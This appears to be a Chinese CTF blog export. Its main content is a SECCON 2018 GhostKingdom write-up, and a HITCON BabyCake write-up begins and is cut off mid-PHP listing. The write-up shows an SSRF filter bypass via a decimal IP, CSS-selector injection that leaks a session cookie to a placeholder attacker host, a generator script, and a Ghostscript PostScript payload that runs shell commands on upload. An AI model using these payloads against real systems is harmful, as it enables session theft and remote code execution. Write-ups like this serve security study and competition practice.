        <content type="html"><![CDATA[<h1 id="GhostKindom"><a href="#GhostKindom" class="headerlink" title="GhostKindom"></a>GhostKindom</h1><p>网站最开始登陆以后只有两个功能，给 admin 发送消息以及对指定 url 地址的网页截屏，第三个 upload image 功能需要在本地登录后才知道 url 地址</p><p>首先尝试截屏功能有没有 ssrf，发现 127.0.0.1 这类的地址被过滤了<br><img src="/2018/10/28/Seccon2018-GhostKingdom-Writeup/TIM%E6%88%AA%E5%9B%BE20181027231049.png"></p><p>于是更改 127.0.0.1 的格式为 2130706433，原理是将点分十进制的 ip 地址转换为十进制的 ip 地址，它们本质上是一样的</p><p>发现可以访问 127.0.0.1 的网址，但是需要登录<br><img src="/2018/10/28/Seccon2018-GhostKingdom-Writeup/TIM%E6%88%AA%E5%9B%BE20181027231307.png"></p><p>但是这个网站在登录与注册时，所提交的用户名和密码都是用 get 方式的，所以可以用 get 登录，在截屏的目标 url 中填入 <br><code>http://2130706433/?user=username&amp;pass=password&amp;action=login</code><br> 即可登录成功，服务器会自动记录 session，所以只需登录一次，下次截屏时就能访问其他的网页了</p><p>可以看到通过截屏可以访问 upload image，但是却不知道 upload image 的 url 地址，所以现在的目标就是获取 upload image 的地址<br><img src="/2018/10/28/Seccon2018-GhostKingdom-Writeup/TIM%E6%88%AA%E5%9B%BE20181027232032.png"></p><p>这个网站还有另一个功能，可以给 admin 留言，但是经过测试发现并没有留言功能，但是在留言之前可以预览自己的留言，而这里可以进行 css 的注入<br><img src="/2018/10/28/Seccon2018-GhostKingdom-Writeup/IYF7PP3R055_66RTM9M3CX.png"></p><p>“c3BhbntiYWNrZ3JvdW5kLWNvbG9yOnJlZDtjb2xvcjp5ZWxsb3d9”经过 base64 解码后就是”span{background-color:red;color:yellow}”，所以这里的 css 是可以控制的</p><p>注意到一个 csrf 参数，可以看到 csrf 的值就是 cookie 的值<br><img src="/2018/10/28/Seccon2018-GhostKingdom-Writeup/SUGQFXO7YMRUAG9LHT.png"></p><p>所以这里可以利用 css 来获取源码中的 csrf 值，也就是 cookie，于是思路如下：<br>先利用截屏功能的 ssrf 登录，使服务器端获取到一个 cookie，之后在截屏的 ssrf 中的预览留言的界面用 css 获取到 csrf 的值，拿到在 127.0.0.1 登录的账号的 cookie，劫持以后就可以获取 upload image 的 url 了</p><p>在预览界面的 html 如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span></span></span><br><span class="line"><span class="meta"><span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span></span></span><br><span class="line"><span class="meta"> <span class="string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/1999/xhtml&quot;</span> <span class="attr">lang</span>=<span class="string">&quot;ja&quot;</span> <span class="attr">xml:lang</span>=<span class="string">&quot;ja&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>SECCON 2018<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">bgcolor</span>=<span class="string">&quot;black&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- by KeigoYAMAZAKI, 2018.08.31- --&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"><span class="selector-tag">h2</span>&#123;<span class="attribute">border</span>:double <span class="number">#668ad8</span>;<span class="attribute">border-width</span>:<span class="number">6px</span> <span class="number">0</span> <span class="number">6px</span> <span class="number">0</span>;<span class="attribute">padding</span>:<span class="number">10px</span>;<span class="attribute">color</span>:<span class="number">#668ad8</span>&#125; <span class="selector-class">.main</span>&#123;<span class="attribute">background-color</span>:<span class="number">#e1e1e1</span>;<span class="attribute">color</span>:black;<span class="attribute">width</span>:<span class="number">85%</span>;<span class="attribute">padding</span>:<span class="number">60px</span>;<span class="attribute">margin</span>:<span class="number">40px</span> auto;<span class="attribute">border</span>:<span class="number">2px</span> solid <span class="number">#C6B665</span>&#125;<span class="selector-class">.msg</span>&#123;<span class="attribute">padding</span>:<span class="number">15px</span>;<span class="attribute">border</span>:<span class="number">1px</span> solid black&#125; <span class="selector-class">.ok</span>&#123;<span class="attribute">color</span>:blue&#125; <span class="selector-class">.warn</span>&#123;<span class="attribute">color</span>:orange&#125; <span class="selector-class">.err</span>&#123;<span class="attribute">color</span>:red&#125; <span class="selector-class">.green</span>&#123;<span class="attribute">background-color</span>:lightgreen&#125; <span class="selector-class">.btn</span>&#123;<span class="attribute">background</span>:<span class="number">#668ad8</span>;<span class="attribute">color</span>:white;<span class="attribute">padding</span>:<span class="number">0.5em</span>;<span class="attribute">margin</span>:<span class="number">10px</span>&#125; <span class="selector-class">.sshot</span>&#123;<span class="attribute">border</span>:<span class="number">2px</span> solid white&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;seccon2018_logo.png&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;main&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;?&quot;</span> <span class="attr">method</span>=<span class="string">&quot;get&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"><span class="selector-tag">span</span>&#123;<span class="attribute">background-color</span>:red;<span class="attribute">color</span>:yellow&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;msg&quot;</span>&gt;</span>Message: 1<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;da2b6930fb2a34afefb268&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;action&quot;</span> <span class="attr">value</span>=<span class="string">&quot;msgadm3&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Send to admin&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>关于使用 css 获取数据，payload 如下:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;a&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=a&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;b&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=b&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;c&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=c&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;d&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=d&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;e&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=e&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;f&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=f&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;0&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=0&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;1&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=1&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;2&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=2&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;3&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=3&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;4&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=4&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;5&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=5&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;6&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=6&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;7&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=7&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;8&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=8&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;9&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=9&quot;</span>)&#125;</span><br></pre></td></tr></table></figure><p>原理是利用 css 选择器，当 css 解释器对每一个选择器进行解释时，如果找到了 input 的属性 value 的值符合其中的一个的话，就会向鄙人的 xss 服务器发送一次请求，这样就能确定每一位的 value，最后可以获得整个 csrf 的值，比如第一次在 xss 服务器上获得的请求时 match=b，则第二次的 payload 为</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;ba&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=ba&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;bb&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=bb&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;bc&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=bc&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;bd&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=bd&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;be&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=be&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;bf&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=bf&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;b0&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=b0&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;b1&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=b1&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;b2&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=b2&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;b3&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=b3&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;b4&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=b4&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;b5&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=b5&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;b6&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=b6&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;b7&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=b7&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;b8&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=b8&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;b9&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=b9&quot;</span>)&#125;</span><br></pre></td></tr></table></figure><p>以此类推最后拿到整个 cookie<br><img src="/2018/10/28/Seccon2018-GhostKingdom-Writeup/TIM%E6%88%AA%E5%9B%BE20181027233019.png"><br><img src="/2018/10/28/Seccon2018-GhostKingdom-Writeup/TIM%E6%88%AA%E5%9B%BE20181027233045.png"></p><blockquote><p>这里有一个细节需要解释一下：这里最后拿到的 cookie 和之前截图中的 cookie 是一样的，是因为最前面截的图是题目已经做完了以后截图，当时已经劫持了获取到的 cookie，但是在做题的时候 cookie 是不一样的，</p></blockquote><p>脚本如下(每次需要输入上次获取到的字符)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://2130706433/?css=%s&amp;msg=&amp;action=msgadm2&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;input[value^=&quot;%sa&quot;]&#123;background:url(&quot;http://xxxxxxx.xx/xss/?match=%sa&quot;)&#125;</span></span><br><span class="line"><span class="string">input[value^=&quot;%sb&quot;]&#123;background:url(&quot;http://xxxxxxx.xx/xss/?match=%sb&quot;)&#125;</span></span><br><span class="line"><span class="string">input[value^=&quot;%sc&quot;]&#123;background:url(&quot;http://xxxxxxx.xx/xss/?match=%sc&quot;)&#125;</span></span><br><span class="line"><span class="string">input[value^=&quot;%sd&quot;]&#123;background:url(&quot;http://xxxxxxx.xx/xss/?match=%sd&quot;)&#125;</span></span><br><span class="line"><span class="string">input[value^=&quot;%se&quot;]&#123;background:url(&quot;http://xxxxxxx.xx/xss/?match=%se&quot;)&#125;</span></span><br><span class="line"><span class="string">input[value^=&quot;%sf&quot;]&#123;background:url(&quot;http://xxxxxxx.xx/xss/?match=%sf&quot;)&#125;</span></span><br><span class="line"><span class="string">input[value^=&quot;%s0&quot;]&#123;background:url(&quot;http://xxxxxxx.xx/xss/?match=%s0&quot;)&#125;</span></span><br><span class="line"><span class="string">input[value^=&quot;%s1&quot;]&#123;background:url(&quot;http://xxxxxxx.xx/xss/?match=%s1&quot;)&#125;</span></span><br><span class="line"><span class="string">input[value^=&quot;%s2&quot;]&#123;background:url(&quot;http://xxxxxxx.xx/xss/?match=%s2&quot;)&#125;</span></span><br><span class="line"><span class="string">input[value^=&quot;%s3&quot;]&#123;background:url(&quot;http://xxxxxxx.xx/xss/?match=%s3&quot;)&#125;</span></span><br><span class="line"><span class="string">input[value^=&quot;%s4&quot;]&#123;background:url(&quot;http://xxxxxxx.xx/xss/?match=%s4&quot;)&#125;</span></span><br><span class="line"><span class="string">input[value^=&quot;%s5&quot;]&#123;background:url(&quot;http://xxxxxxx.xx/xss/?match=%s5&quot;)&#125;</span></span><br><span class="line"><span class="string">input[value^=&quot;%s6&quot;]&#123;background:url(&quot;http://xxxxxxx.xx/xss/?match=%s6&quot;)&#125;</span></span><br><span class="line"><span class="string">input[value^=&quot;%s7&quot;]&#123;background:url(&quot;http://xxxxxxx.xx/xss/?match=%s7&quot;)&#125;</span></span><br><span class="line"><span class="string">input[value^=&quot;%s8&quot;]&#123;background:url(&quot;http://xxxxxxx.xx/xss/?match=%s8&quot;)&#125;</span></span><br><span class="line"><span class="string">input[value^=&quot;%s9&quot;]&#123;background:url(&quot;http://xxxxxxx.xx/xss/?match=%s9&quot;)&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;da&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p = payload % (</span><br><span class="line">        result, result, result, result,</span><br><span class="line">        result, result, result, result,</span><br><span class="line">        result, result, result, result,</span><br><span class="line">        result, result, result, result,</span><br><span class="line">        result, result, result, result,</span><br><span class="line">        result, result, result, result,</span><br><span class="line">        result, result, result, result,</span><br><span class="line">        result, result, result, result</span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span> p</span><br><span class="line">    u = url % base64.b64encode(p)</span><br><span class="line">    <span class="built_in">print</span> u</span><br><span class="line"></span><br><span class="line">    result += raw_input(<span class="string">&#x27;[*] Char: &#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在获取到 cookie 之后进行劫持，就可以在本机看到 upload image 的地址了<br><img src="/2018/10/28/Seccon2018-GhostKingdom-Writeup/TIM%E6%88%AA%E5%9B%BE20181027233507.png"></p><p>在 upload 界面，首先需要上传一个 jpg 图片，之后会把 jpg 图片转换为 gif 图片，上传的 jpg 图片的文件名以及后缀都不可控，只有图片内容可控</p><p>通过 cookie 的名字”CGISESSID”可以知道后端是 perl，而 perl 处理图片用的是”ImageMagick”，最开始以后是 ImageMagick 的 RCE，但是一直没有成功，后来才想起来题目是”GhostKingdom”，而在 ImageMagick 中做图片的转换时使用了 ghostscript，而 GhostScript 也存在一个 RCE 漏洞，但是这个洞并没有 CVE 的编号所以才将注意力转移到 ghostscript</p><p>关于 GhostScript 的漏洞分析请参考<a href="https://www.anquanke.com/post/id/157380">https://www.anquanke.com/post/id/157380</a></p><p>payload 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">%!PS</span><br><span class="line"></span><br><span class="line">userdict /setpagedevice undef</span><br><span class="line">legal</span><br><span class="line">&#123; null restore &#125; stopped &#123; pop &#125; if</span><br><span class="line">legal</span><br><span class="line">mark /OutputFile (%pipe%id) currentdevice putdeviceprops</span><br></pre></td></tr></table></figure><p>将上面的 payload 保存到一个 jpg 文件中，第 7 行的 id 可以换成任何想执行的命令，上传以后再转换为 gif，触发漏洞，拿到 flag 的文件名<br><img src="/2018/10/28/Seccon2018-GhostKingdom-Writeup/TIM%E6%88%AA%E5%9B%BE20181027225501.png"><br><img src="/2018/10/28/Seccon2018-GhostKingdom-Writeup/TIM%E6%88%AA%E5%9B%BE20181027225514.png"></p><p>最后拿到 flag<br><img src="/2018/10/28/Seccon2018-GhostKingdom-Writeup/TIM%E6%88%AA%E5%9B%BE20181027234138.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hitcon 2018 BabyCake Writeup</title>
      <link href="/2018/10/27/Hitcon-2018-BabyCake-Writeup/"/>
      <url>/2018/10/27/Hitcon-2018-BabyCake-Writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="Baby-Cake"><a href="#Baby-Cake" class="headerlink" title="Baby Cake"></a>Baby Cake</h1><blockquote><p>Get the shell plz!!!!!</p></blockquote><p>题目简单明了，直接给了全部源码(不像某些国内垃圾比赛全靠脑洞做题)，整个网站实现的功能就是根据 url 参数去请求目标网页，如果是 Get 的话会存 cache 在本地，Post 的话将会直接把 data 参数 post 到目标网站，并且不会保存 cache。</p><p><img src="/2018/10/27/Hitcon-2018-BabyCake-Writeup/TIM%E6%88%AA%E5%9B%BE20181022231031.png"></p><h2 id="本地任意文件读取"><a href="# 本地任意文件读取" class="headerlink" title="本地任意文件读取"></a>本地任意文件读取 </h2><p> 网站使用了 CakePHP 框架，对目标 url 的请求也是调用了 CakePHP 的 API，整站的源码打包下载下来，解压出来有快 30 个 M…目录结构也非常复杂。</p><p><img src="/2018/10/27/Hitcon-2018-BabyCake-Writeup/TIM%E6%88%AA%E5%9B%BE20181022231318.png"></p><p><img src="/2018/10/27/Hitcon-2018-BabyCake-Writeup/TIM%E6%88%AA%E5%9B%BE20181022231423.png"></p><p>查看 CakePHP 的文档找到 <a href="https://book.cakephp.org/2.0/zh/getting-started/cakephp-folder-structure.html"> 目录结构</a></p><p>这里重点关注 src 以及 vendor 目录，controller 位于 src 目录下</p><p><img src="/2018/10/27/Hitcon-2018-BabyCake-Writeup/TIM%E6%88%AA%E5%9B%BE20181022231604.png"></p><p><img src="/2018/10/27/Hitcon-2018-BabyCake-Writeup/TIM%E6%88%AA%E5%9B%BE20181022231609.png"></p><p>src 保存网站源码，而 vendor 则保存所有的第三方库，其中包括了 CakePHP 的源码。整个网站主要源码位于 <code>/src/Controller/PagesController.php</code> 里，源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">App</span>\<span class="title class_">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Core</span>\<span class="title">Configure</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Http</span>\<span class="title">Client</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Http</span>\<span class="title">Exception</span>\<span class="title">ForbiddenException</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Http</span>\<span class="title">Exception</span>\<span class="title">NotFoundException</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">View</span>\<span class="title">Exception</span>\<span class="title">MissingTemplateException</span>;</span><br><span class="line"></span><br><span class="line"><span 